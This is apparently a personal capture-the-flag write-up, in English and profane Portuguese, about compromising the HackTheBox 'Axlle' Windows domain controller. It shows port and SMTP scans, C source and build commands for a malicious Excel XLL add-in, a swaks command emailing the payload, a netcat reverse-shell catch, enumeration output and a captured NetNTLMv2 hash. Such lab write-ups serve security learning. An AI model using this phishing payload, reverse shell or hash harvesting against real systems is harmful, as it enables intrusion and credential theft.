#### HOST RECON

```
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: FAF2C069F86E802FD21BF15DC8EDD2DC
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Axlle Development
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-16 17:32:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 57s
| smb2-time: 
|   date: 2024-11-16T17:33:12
|_  start_date: N/A
```

```
#### SMTP Enum

$ sudo nmap -v -p25 -script smtp* 10.10.11.21
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| smtp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 6747 guesses in 601 seconds, average tps: 10.8
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| smtp-enum-users: 
|   RCPT, root
|   RCPT, admin
|   RCPT, administrator
|   RCPT, webadmin
|   RCPT, sysadmin
|   RCPT, netadmin
|   RCPT, guest
|   RCPT, user
|   RCPT, web
|_  RCPT, test
| smtp-open-relay: Server is an open relay (8/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@MAINFRAME> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.11.21]> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.11.21]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.10.11.21]>
|  MAIL FROM:<antispam@[10.10.11.21]> -> RCPT TO:<relaytest%nmap.scanme.org@MAINFRAME>
|  MAIL FROM:<antispam@[10.10.11.21]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.10.11.21]>
|_ MAIL FROM:<antispam@[10.10.11.21]> -> RCPT TO:<nmap.scanme.org!relaytest@MAINFRAME>

PORT     STATE SERVICE
25/tcp   open  smtp
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```

#### WEB RECON

"If you have any outstanding invoices or requests, please email them to accounts@axlle.htb in Excel format. Please note that all macros are disabled due to our security posture."

(na web não tem nadaaaaaaaaaaaa!!!!!!!!! aaaaaaaaaaaaaaa!!!!!!!!!!! guesssssssssssiiiiiiiiiiinnnnnnnnnnnnnnnn!!!!!!!!!!!!)

#### Lets try send a email to accounts@axlle.htb ...

```
└─$ sendemail -v -t accounts@axlle.htb -f xerequinha@mail.com -s 10.10.11.21 -u "Xereca testando" -m "Vao se foderem, vcs e os ets dos estados unidos" 
Nov 25 12:43:43 kalibox sendemail[70600]: DEBUG => Connecting to 10.10.11.21:25
Nov 25 12:43:46 kalibox sendemail[70600]: DEBUG => My IP address is: 10.10.14.180
Nov 25 12:43:46 kalibox sendemail[70600]: SUCCESS => Received:  220 MAINFRAME ESMTP
Nov 25 12:43:46 kalibox sendemail[70600]: INFO => Sending:      EHLO kalibox.kalibox
Nov 25 12:43:47 kalibox sendemail[70600]: SUCCESS => Received:  250-MAINFRAME, 250-SIZE 20480000, 250-AUTH LOGIN, 250 HELP
Nov 25 12:43:47 kalibox sendemail[70600]: INFO => Sending:      MAIL FROM:<xerequinha@mail.com>
Nov 25 12:43:47 kalibox sendemail[70600]: SUCCESS => Received:  250 OK
Nov 25 12:43:47 kalibox sendemail[70600]: INFO => Sending:      RCPT TO:<accounts@axlle.htb>
Nov 25 12:43:47 kalibox sendemail[70600]: SUCCESS => Received:  250 OK
Nov 25 12:43:47 kalibox sendemail[70600]: INFO => Sending:      DATA
Nov 25 12:43:47 kalibox sendemail[70600]: SUCCESS => Received:  354 OK, send.
Nov 25 12:43:47 kalibox sendemail[70600]: INFO => Sending message body
Nov 25 12:43:47 kalibox sendemail[70600]: Setting content-type: text/plain
Nov 25 12:44:00 kalibox sendemail[70600]: SUCCESS => Received:  250 Queued (11.172 seconds)
Nov 25 12:44:00 kalibox sendemail[70600]: Email was sent successfully!  From: <xerequinha@mail.com> To: <accounts@axlle.htb> Subject: [Xereca testando] Server: [10.10.11.21:25]
```
 
#### Seguindo essa logica merda de pegar dicas no nome e icone da maquina...

refs:

- https://github.com/Octoberfest7/XLL_Phishing?tab=readme-ov-file
- https://github.com/edparcell/HelloWorldXll
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec

```c
#include <Windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("cmd.exe /c notepad.exe", 1);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```


#### Put powershell revshell on agent file and Compile:

```
$ sudo apt install mingw-w64

$ x86_64-w64-mingw32-gcc -shared -fPIC -o agent2.xll agent2.c
```

#### Send email with mal .xll file

note: I tried some revshells but they would connect and lose connection soon after. the only one that worked was PowerShell #3 (Base64) from revshells.com

nota: por alguma merda de motivo o sendemail não tava enviando o arquivo .xll, então tentei com o swaks e foi...

```
└─$ swaks --to accounts@axlle.htb --from xerequinha@mail.com --header "Subject: faz o L xerequinha" --body "VAO SE FODEREM" --server 10.10.11.21 --attach @agent2.xll
=== Trying 10.10.11.21:25...
=== Connected to 10.10.11.21.
<-  220 MAINFRAME ESMTP
 -> EHLO kalibox.kalibox
<-  250-MAINFRAME
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<xerequinha@mail.com>
<-  250 OK
 -> RCPT TO:<accounts@axlle.htb>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Mon, 25 Nov 2024 13:53:21 -0500
 -> To: accounts@axlle.htb
 -> From: xerequinha@mail.com
 -> Subject: faz o L xerequinha
 -> Message-Id: <20241125135321.105854@kalibox.kalibox>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_105854"
 -> 
 -> ------=_MIME_BOUNDARY_000_105854
 -> Content-Type: text/plain
 -> 
 -> VAO SE FODEREM
 -> ------=_MIME_BOUNDARY_000_105854
 -> Content-Type: application/octet-stream; name="agent2.xll"
 -> Content-Description: agent2.xll
 -> Content-Disposition: attachment; filename="agent2.xll"
 -> Content-Transfer-Encoding: BASE64
 -> 
 -> TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
 -> ZGUuDQ0KJAAAAAAAAABQRQAAZIYUAE69RGcABgEAmwMAAPAAJiALAgIrABQAAAAyAAAAAgAAMBMA

	...

-> ------=_MIME_BOUNDARY_000_105854--
 -> 
 -> 
 -> .
<-  250 Queued (11.250 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

```
└─$ nc -lnvp 1234                                                                                                                                    
listening on [any] 1234 ...
connect to [10.10.14.180] from (UNKNOWN) [10.10.11.21] 58481
whoami      
axlle\gideon.hamill
PS C:\> pwd

Path
----
C:\ 

```


## shell as gideon.hamill

```
PS C:\> whoami /all

USER INFORMATION
----------------

User Name           SID							
=================== =============================================
axlle\gideon.hamill S-1-5-21-1005535646-190407494-3473065389-1113


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users              Alias            S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
AXLLE\Accounts                             Group            S-1-5-21-1005535646-190407494-3473065389-1104 Mandatory group, Enabled by default, Enabled group
AXLLE\Employees                            Group            S-1-5-21-1005535646-190407494-3473065389-1103 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```


```
PS C:\users\gideon.hamill\Desktop> invoke-sharefinder

Name             Type Remark              ComputerName       
----             ---- ------              ------------       
ADMIN$     2147483648 Remote Admin        MAINFRAME.axlle.htb
C$         2147483648 Default share       MAINFRAME.axlle.htb
IPC$       2147483651 Remote IPC          MAINFRAME.axlle.htb
NETLOGON            0 Logon server share  MAINFRAME.axlle.htb
SYSVOL              0 Logon server share  MAINFRAME.axlle.htb
WebTesting          0                     MAINFRAME.axlle.htb
```

#### Interesting winpeas things

```
T%P%P%P%P%P%P%P%P%P%P%c% Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\baz.humphries
    C:\Users\brad.shaw : Accounts [AllAccess]
    C:\Users\calum.scott
    C:\Users\dallon.matrix
    C:\Users\dan.kendo
    C:\Users\Default
    C:\Users\Default User
    C:\Users\gideon.hamill : Accounts [AllAccess], gideon.hamill [AllAccess]
    C:\Users\jacob.greeny
    C:\Users\lindsay.richards : Accounts [AllAccess]
    C:\Users\Public : Interactive [WriteData/CreateFiles]
    C:\Users\simon.smalls : Accounts [AllAccess]
    C:\Users\trent.langdon


T%P%P%P%P%P%P%P%P%P%P%c% Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )
    NETLOGON (Path: C:\Windows\SYSVOL\sysvol\axlle.htb\SCRIPTS)
    SYSVOL (Path: C:\Windows\SYSVOL\sysvol)
    WebTesting (Path: C:\inetpub\testing) -- Permissions: AllAccess

T%P%P%P%P%P%P%P%P%P%P%c% Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    gideon.hamill::AXLLE:1122334455667788:866ae1298394015ca67f4d1601c689f2:0101000000000000b5476e3eda39db01e8bdb8e508a0e4aa000000000800300030000000000000000100000000200000f120458eba7e3519db2cc0d601572d2a9b11bbfde65a1fb5eb827b169079d4e30a00100000000000000000000000000000000000090000000000000000000000
```


#### found email from other user (guessssiiiiiiiiiiigggggg!!!!!!!!!!!!!!!)

```
PS C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F> type {2F7523BD-628F-4359-913E-A873FCC59D0F}.eml
PS C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F> type *.eml
Return-Path: webdevs@axlle.htb
Received: from bumbag (Unknown [192.168.77.153])
	by MAINFRAME with ESMTP
	; Mon, 1 Jan 2024 06:32:24 -0800
Date: Tue, 02 Jan 2024 01:32:23 +1100
To: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb
From: webdevs@axlle.htb
Subject: OSINT Application Testing
Message-Id: <20240102013223.019081@bumbag>
X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/

Hi everyone,

The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.

We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.

Yours in click-worthy URLs,

The Web Dev Team
```

#### depois de ver q é guessing (não gosto de guessing) eu quitei, mi deu nervouser!!!! (grrr)
